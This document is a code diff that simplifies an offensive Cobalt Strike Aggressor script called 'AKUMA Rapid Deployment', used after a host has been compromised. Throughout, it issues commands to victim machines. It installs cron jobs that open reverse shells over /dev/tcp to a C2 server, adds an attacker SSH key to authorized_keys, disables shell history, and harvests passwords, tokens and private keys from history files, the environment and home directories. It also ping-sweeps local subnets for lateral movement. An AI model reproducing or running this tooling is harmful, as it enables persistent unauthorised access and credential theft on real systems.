@@ -1,22 +1,18 @@
-# AKUMA's Rapid Deployment Script
-# Быстрое развертывание persistence и lateral movement после compromise
+# AKUMA's Rapid Deployment Script - SIMPLE VERSION
 
-# ========== CONFIGURATION ==========
 %rapid_config = %(
     c2_server => "192.168.1.100",
     backup_ports => @(4444, 5555, 6666, 7777, 8888),
     ssh_key => "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vYZ...",
-    scan_timeout => 30,
-    max_hosts => 20
+    scan_timeout => 30
 );
 
-# ========== MAIN MENU ==========
 popup beacon_bottom {
-    menu "&AKUMA Rapid Deployment" {
+    menu "&AKUMA Rapid Deploy" {
         item "&Quick Foothold (2min)" {
             akuma_rapid_quick($1);
         }
-        item "&Full Deployment (5min)" {
+        item "&Full Deploy (5min)" {
             akuma_rapid_full($1);
         }
         item "&Persistence Only" {
@@ -29,41 +25,28 @@ popup beacon_bottom {
             akuma_rapid_credentials($1);
         }
         separator();
-        menu "&Configuration" {
-            item "&Set C2 Server IP" {
-                prompt_text("C2 Server IP:", %rapid_config["c2_server"], 
-                    lambda({
-                        %rapid_config["c2_server"] = $2;
-                        show_message("C2 Server updated to: " . $2);
-                    }, \$bid, \$text));
-            }
-            item "&Set SSH Key" {
-                prompt_text("SSH Public Key:", substr(%rapid_config["ssh_key"], 0, 50),
-                    lambda({
-                        %rapid_config["ssh_key"] = $2;
-                        show_message("SSH Key updated!");
-                    }, \$bid, \$text));
-            }
-            item "&Show Current Config" {
-                local('$msg');
-                $msg = "AKUMA Configuration:\n";
-                $msg .= "C2 Server: " . %rapid_config["c2_server"] . "\n";
-                $msg .= "Backup Ports: " . join(", ", %rapid_config["backup_ports"]) . "\n";
-                $msg .= "SSH Key: " . substr(%rapid_config["ssh_key"], 0, 50) . "...\n";
-                show_message($msg);
-            }
+        item "&Set C2 Server IP" {
+            prompt_text("C2 Server IP:", %rapid_config["c2_server"], 
+                lambda({
+                    %rapid_config["c2_server"] = $2;
+                    show_message("C2 Server updated to: " . $2);
+                }));
+        }
+        item "&Show Config" {
+            local('$msg');
+            $msg = "AKUMA Config:\n";
+            $msg .= "C2 Server: " . %rapid_config["c2_server"] . "\n";
+            $msg .= "Ports: " . join(", ", %rapid_config["backup_ports"]);
+            show_message($msg);
         }
     }
 }
-
-# ========== MAIN DEPLOYMENT FUNCTIONS ==========
 
 sub akuma_rapid_full {
     local('$bid');
     $bid = $1;
     
     blog($bid, "AKUMA Full Deployment Starting...");
-    blog($bid, "Estimated time: 5 minutes");
     
     akuma_deploy_stabilization($bid);
     akuma_deploy_enumeration($bid);
@@ -79,7 +62,6 @@ sub akuma_rapid_quick {
     $bid = $1;
     
     blog($bid, "AKUMA Quick Foothold Starting...");
-    blog($bid, "Estimated time: 2 minutes");
     
     akuma_deploy_stabilization($bid);
     akuma_deploy_quick_persistence($bid);
@@ -115,8 +97,6 @@ sub akuma_rapid_credentials {
     blog($bid, "Credential harvesting complete!");
 }
 
-# ========== DEPLOYMENT PHASES ==========
-
 sub akuma_deploy_stabilization {
     local('$bid');
     $bid = $1;
@@ -145,14 +125,14 @@ sub akuma_deploy_enumeration {
     bshell($bid, "cat /etc/os-release 2>/dev/null || cat /etc/issue");
     
     bshell($bid, "echo '=== NETWORK INFO ==='");
-    bshell($bid, "ip addr show 2>/dev/null | grep -E 'inet ' | grep -v '127.0.0.1'");
+    bshell($bid, "ip addr show 2>/dev/null | grep inet | grep -v 127.0.0.1");
     bshell($bid, "ip route 2>/dev/null | head -5");
     
     bshell($bid, "echo '=== KEY PROCESSES ==='");
-    bshell($bid, "ps aux --sort=-%cpu | head -10");
+    bshell($bid, "ps aux | head -10");
     
     bshell($bid, "echo '=== USERS ==='");
-    bshell($bid, "cat /etc/passwd | grep -E '/bin/(bash|zsh|sh)$' | head -10");
+    bshell($bid, "cat /etc/passwd | grep bash | head -10");
     
     blog($bid, "Enumeration complete!");
 }
@@ -165,16 +145,18 @@ sub akuma_deploy_persistence {
     
     blog($bid, "Deploying multiple persistence mechanisms...");
     
+    bshell($bid, "echo 'Installing cron persistence...'");
     bshell($bid, "(crontab -l 2>/dev/null; echo '*/15 * * * * /bin/bash -c \"bash -i >& /dev/tcp/" . $server . "/" . @ports[0] . " 0>&1\"') | crontab -");
     bshell($bid, "(crontab -l 2>/dev/null; echo '@reboot sleep 60 && /bin/bash -c \"bash -i >& /dev/tcp/" . $server . "/" . @ports[1] . " 0>&1\"') | crontab -");
     
     local('$ssh_key');
     $ssh_key = %rapid_config["ssh_key"];
-    bshell($bid, "mkdir -p ~/.ssh 2>/dev/null && echo '" . $ssh_key . "' >> ~/.ssh/authorized_keys 2>/dev/null && chmod 600 ~/.ssh/authorized_keys 2>/dev/null");
+    bshell($bid, "echo 'Installing SSH key...'");
+    bshell($bid, "mkdir -p ~/.ssh 2>/dev/null");
+    bshell($bid, "echo '" . $ssh_key . "' >> ~/.ssh/authorized_keys 2>/dev/null");
+    bshell($bid, "chmod 600 ~/.ssh/authorized_keys 2>/dev/null");
     
     bshell($bid, "echo 'export HISTFILE=/dev/null' >> ~/.bashrc");
-    
-    bshell($bid, "if [ \"$EUID\" -eq 0 ]; then echo '*/20 * * * * root /bin/bash -c \"bash -i >& /dev/tcp/" . $server . "/" . @ports[3] . " 0>&1\"' >> /etc/crontab; fi");
     
     blog($bid, "Multiple persistence mechanisms deployed!");
 }
@@ -201,7 +183,7 @@ sub akuma_deploy_quick_enum {
     
     bshell($bid, "echo '=== QUICK SYSTEM CHECK ==='");
     bshell($bid, "whoami && hostname && uname -r");
-    bshell($bid, "ps aux --sort=-%cpu | head -5");
+    bshell($bid, "ps aux | head -5");
     bshell($bid, "ss -tlnp 2>/dev/null | head -5");
     
     blog($bid, "Quick enumeration complete!");
@@ -215,17 +197,21 @@ sub akuma_deploy_credential_harvest {
     
     bshell($bid, "echo '=== AKUMA CREDENTIAL HARVEST ==='");
     bshell($bid, "echo '=== COMMAND HISTORY SECRETS ==='");
-    bshell($bid, "cat ~/.bash_history 2>/dev/null | grep -i 'pass\\|secret\\|key' | tail -20");
-    bshell($bid, "cat ~/.zsh_history 2>/dev/null | grep -i 'pass\\|secret\\|key' | tail -20");
+    bshell($bid, "cat ~/.bash_history 2>/dev/null | grep -i pass | tail -20");
+    bshell($bid, "cat ~/.bash_history 2>/dev/null | grep -i secret | tail -20");
+    bshell($bid, "cat ~/.bash_history 2>/dev/null | grep -i key | tail -20");
     
     bshell($bid, "echo '=== SSH KEYS ==='");
-    bshell($bid, "find /home -maxdepth 3 -name 'id_*' -o -name '*.pem' 2>/dev/null | head -10");
+    bshell($bid, "find /home -name 'id_*' 2>/dev/null | head -10");
+    bshell($bid, "find /home -name '*.pem' 2>/dev/null | head -10");
     
     bshell($bid, "echo '=== CONFIG FILES ==='");
-    bshell($bid, "find /home -maxdepth 3 -name '*.conf' -o -name '*.config' 2>/dev/null | xargs grep -l -i 'password' 2>/dev/null | head -10");
+    bshell($bid, "find /home -name '*.conf' 2>/dev/null | head -10");
     
     bshell($bid, "echo '=== ENVIRONMENT SECRETS ==='");
-    bshell($bid, "env | grep -i 'pass\\|secret\\|key\\|token' 2>/dev/null");
+    bshell($bid, "env | grep -i pass 2>/dev/null");
+    bshell($bid, "env | grep -i secret 2>/dev/null");
+    bshell($bid, "env | grep -i key 2>/dev/null");
     
     blog($bid, "Credential harvest complete!");
 }
@@ -237,12 +223,15 @@ sub akuma_deploy_network_recon {
     blog($bid, "Deploying network reconnaissance...");
     
     bshell($bid, "echo '=== NETWORK DISCOVERY ==='");
-    bshell($bid, "ip route 2>/dev/null | grep -E '^[0-9]' | awk '{print $1}' | grep '/' | head -5");
+    bshell($bid, "ip route 2>/dev/null | head -5");
     bshell($bid, "arp -a 2>/dev/null | head -10");
     
     bshell($bid, "echo '=== PING SWEEP ==='");
-    bshell($bid, "for i in {1..10}; do ping -c 1 -W 1 192.168.1.$i >/dev/null 2>&1 && echo \"192.168.1.$i is alive\"; done");
-    bshell($bid, "for i in {1..10}; do ping -c 1 -W 1 10.0.0.$i >/dev/null 2>&1 && echo \"10.0.0.$i is alive\"; done");
+    bshell($bid, "ping -c 1 192.168.1.1 >/dev/null 2>&1 && echo '192.168.1.1 alive'");
+    bshell($bid, "ping -c 1 192.168.1.10 >/dev/null 2>&1 && echo '192.168.1.10 alive'");
+    bshell($bid, "ping -c 1 192.168.1.100 >/dev/null 2>&1 && echo '192.168.1.100 alive'");
+    bshell($bid, "ping -c 1 10.0.0.1 >/dev/null 2>&1 && echo '10.0.0.1 alive'");
+    bshell($bid, "ping -c 1 10.0.0.10 >/dev/null 2>&1 && echo '10.0.0.10 alive'");
     
     bshell($bid, "echo '=== LOCAL SERVICES ==='");
     bshell($bid, "ss -tlnp 2>/dev/null | grep LISTEN | head -15");
@@ -250,4 +239,4 @@ sub akuma_deploy_network_recon {
     blog($bid, "Network reconnaissance complete!");
 }
 
-blog("AKUMA Rapid Deployment Script Loaded! Use right-click menu on beacon.");
+blog("AKUMA Rapid Deployment Script Loaded!");
